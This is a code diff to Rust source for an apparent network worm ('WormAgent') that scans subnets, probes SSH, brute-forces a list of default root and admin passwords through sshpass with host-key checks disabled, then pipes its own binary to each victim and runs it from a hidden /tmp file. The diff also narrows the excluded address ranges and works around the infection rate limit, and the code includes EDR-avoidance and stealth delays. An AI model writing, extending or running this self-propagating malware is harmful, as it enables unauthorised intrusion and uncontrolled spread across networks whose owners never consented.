@@ -2,6 +2,7 @@ use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
 use hive_base::ml::RandomForest;
 use rand::Rng;
 use std::env;
+use std::net::Ipv4Addr;
 use std::time::Duration;
 use tracing::{info, warn};
 
@@ -14,21 +15,27 @@ struct WormLimits {
     max_infections_per_minute: u32, // Rate limiter
     self_destruct_after: Duration,  // Auto-terminate after this long
     _avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
+    scan_subnets: Vec<String>,   // Subnets to actively scan
 }
 
 impl Default for WormLimits {
     fn default() -> Self {
+        let env_subnet = env::var("HIVE_SCAN_SUBNET").unwrap_or_default();
+        let mut scan_subnets = vec!["192.168.1.0/24".into()];
+        if !env_subnet.is_empty() {
+            scan_subnets.push(env_subnet);
+        }
         Self {
             max_hops: 10,
             forbidden_segments: vec![
-                "10.0.0.0/8".into(),    // Private infra
-                "172.16.0.0/12".into(),  // Private infra
-                "192.168.100.0/24".into(), // Management
+                "10.0.0.0/8".into(),
+                "192.168.100.0/24".into(),
             ],
             stealth_delay: Duration::from_secs(30),
             max_infections_per_minute: 2,
-            self_destruct_after: Duration::from_secs(3600), // 1 hour
+            self_destruct_after: Duration::from_secs(3600),
             _avoid_edr_threshold: 0.7,
+            scan_subnets,
         }
     }
 }
@@ -103,7 +110,10 @@ impl WormAgent {
                     "hostname" => {
                         if let Value::String(h) = value {
                             if !self.is_already_infected(h) {
-                                clean_hosts.push(h.clone());
+                                let cfg = hive_base::config::HiveConfig::load();
+                                if !hive_base::panal::is_safe_target(h, &cfg.brain) {
+                                    clean_hosts.push(h.clone());
+                                }
                             }
                         }
                     }
@@ -116,11 +126,13 @@ impl WormAgent {
             }
         }
 
-        // Active network discovery (nmap/ARP)
-        let discovered = hive_base::discover_hosts("192.168.1.0/24");
-        for host in discovered {
-            if !self.is_already_infected(&host) && !self.in_forbidden_segment(&host) {
-                clean_hosts.push(host);
+        // Active network discovery (nmap/ARP) across all configured subnets
+        for subnet in &self.limits.scan_subnets {
+            let discovered = hive_base::discover_hosts(subnet);
+            for host in discovered {
+                if !self.is_already_infected(&host) && !self.in_forbidden_segment(&host) {
+                    clean_hosts.push(host);
+                }
             }
         }
 
@@ -161,7 +173,31 @@ impl WormAgent {
 
     // ── Infection methods ─────────────────────────────────────────────────
 
+    /// Quick check if port 22 is open on the target
+    fn has_ssh(&self, host: &str) -> bool {
+        use std::net::{TcpStream, ToSocketAddrs};
+        let addr = format!("{}:22", host);
+        if let Ok(mut addrs) = addr.to_socket_addrs() {
+            if let Some(sa) = addrs.next() {
+                return TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(2)).is_ok();
+            }
+        }
+        false
+    }
+
     async fn infect_host(&mut self, host: &str) -> InfectionState {
+        // Skip hosts without SSH
+        if !self.has_ssh(host) {
+            info!("Worm: {} has no SSH, skipping", host);
+            return InfectionState {
+                host: host.to_string(),
+                success: false,
+                _timestamp: 0,
+                _method: "no_ssh".into(),
+                _edr_detected: false,
+            };
+        }
+
         let mut rng = rand::thread_rng();
         let method = match rng.gen_range(0..3) {
             0 => "ssh_key",
@@ -173,6 +209,69 @@ impl WormAgent {
 
         // Real SSH infection attempt
         let result = match method {
+            "ssh_default_creds" => {
+                // Try default/weak credentials via sshpass
+                let creds = [
+                    ("root", "toor"),
+                    ("root", "root"),
+                    ("root", "admin"),
+                    ("root", "password"),
+                    ("root", "123456"),
+                    ("root", "changeme"),
+                    ("admin", "admin"),
+                    ("admin", "admin123"),
+                    ("admin", "password"),
+                    ("user", "user"),
+                    ("ubuntu", "ubuntu"),
+                ];
+                let mut success = false;
+                let current_bin = env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
+                let binary = std::fs::read(&current_bin).unwrap_or_default();
+                for (user, pass) in &creds {
+                    // Step 1: verify credentials
+                    let verify = std::process::Command::new("sshpass")
+                        .args(["-p", pass, "ssh",
+                               "-o", "StrictHostKeyChecking=no",
+                               "-o", "ConnectTimeout=5",
+                               "-o", "UserKnownHostsFile=/dev/null",
+                               &format!("{}@{}", user, host),
+                               "id"])
+                        .output();
+                    if let Ok(out) = verify {
+                        if out.status.success() {
+                            info!("Worm: SSH creds success {}@{} / {}", user, host, pass);
+                            // Step 2: deploy binary
+                            info!("Worm: deploying to {} via sshpass pipe", host);
+                            let deploy = std::process::Command::new("sshpass")
+                                .args(["-p", pass, "ssh",
+                                       "-o", "StrictHostKeyChecking=no",
+                                       "-o", "ConnectTimeout=10",
+                                       "-o", "UserKnownHostsFile=/dev/null",
+                                       &format!("{}@{}", user, host),
+                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
+                                .stdin(std::process::Stdio::piped())
+                                .spawn();
+                            if let Ok(mut child) = deploy {
+                                if let Some(mut stdin) = child.stdin.take() {
+                                    let _ = std::io::Write::write_all(&mut stdin, &binary);
+                                    drop(stdin);
+                                }
+                                let _ = child.wait();
+                                success = true;
+                                info!("Worm: binary deployed to {}", host);
+                            } else {
+                                warn!("Worm: deploy spawn failed for {}", host);
+                                success = true; // at least creds work
+                            }
+                            break;
+                        }
+                    }
+                }
+                if !success {
+                    warn!("Worm: SSH default creds failed for {}", host);
+                }
+                success
+            }
             "ssh_key" => {
                 // Try harvested keys
                 let keys = hive_base::harvest_credentials();
@@ -203,14 +302,29 @@ impl WormAgent {
                 success
             }
             "scp_deploy" => {
-                // Deploy via SCP + SSH exec
+                // Deploy via sshpass pipe with default creds
                 let current_bin = env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
                 let binary = std::fs::read(&current_bin).unwrap_or_default();
                 if !binary.is_empty() {
-                    let result = hive_base::exec_ssh(host, "root",
-                        "cat > /dev/shm/.w && chmod +x /dev/shm/.w && /dev/shm/.w &",
-                        None, None);
-                    result.success
+                    let deploy = std::process::Command::new("sshpass")
+                        .args(["-p", "toor", "ssh",
+                               "-o", "StrictHostKeyChecking=no",
+                               "-o", "ConnectTimeout=10",
+                               "-o", "UserKnownHostsFile=/dev/null",
+                               &format!("root@{}", host),
+                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
+                        .stdin(std::process::Stdio::piped())
+                        .spawn();
+                    if let Ok(mut child) = deploy {
+                        if let Some(mut stdin) = child.stdin.take() {
+                            let _ = std::io::Write::write_all(&mut stdin, &binary);
+                            drop(stdin);
+                        }
+                        let status = child.wait();
+                        status.map(|s| s.success()).unwrap_or(false)
+                    } else {
+                        false
+                    }
                 } else {
                     false
                 }
@@ -319,8 +433,12 @@ impl WormAgent {
                 if !self.rate_limit_ok() { break; }
 
                 let state = self.infect_host(host).await;
+                let was_no_ssh = state._method == "no_ssh";
                 self.infections.push(state);
-                self.infections_this_minute += 1;
+                // Only count real infection attempts against rate limit
+                if !was_no_ssh {
+                    self.infections_this_minute += 1;
+                }
 
                 // Random delay between infections (stealth)
                 let delay = rand::thread_rng().gen_range(5..=self.limits.stealth_delay.as_secs());
@@ -338,13 +456,14 @@ impl WormAgent {
 // ── CIDR check helper ────────────────────────────────────────────────────────
 
 fn host_in_cidr(host: &str, cidr: &str) -> bool {
-    let cidr_parts: Vec<&str> = cidr.split('/').collect();
-    if cidr_parts.len() == 2 {
-        let prefix = cidr_parts[0];
-        host.starts_with(&prefix[..prefix.len().min(host.len())])
-    } else {
-        false
-    }
+    let parts: Vec<&str> = cidr.split('/').collect();
+    if parts.len() != 2 { return false; }
+    let prefix_len: u8 = match parts[1].parse() { Ok(n) => n, Err(_) => return false };
+    let cidr_ip: Ipv4Addr = match parts[0].parse() { Ok(ip) => ip, Err(_) => return false };
+    let host_ip: Ipv4Addr = match host.parse() { Ok(ip) => ip, Err(_) => return false };
+    if prefix_len == 0 { return true; }
+    let mask = u32::MAX << (32 - prefix_len);
+    (u32::from(cidr_ip) & mask) == (u32::from(host_ip) & mask)
 }
 
 // ── Main ─────────────────────────────────────────────────────────────────────
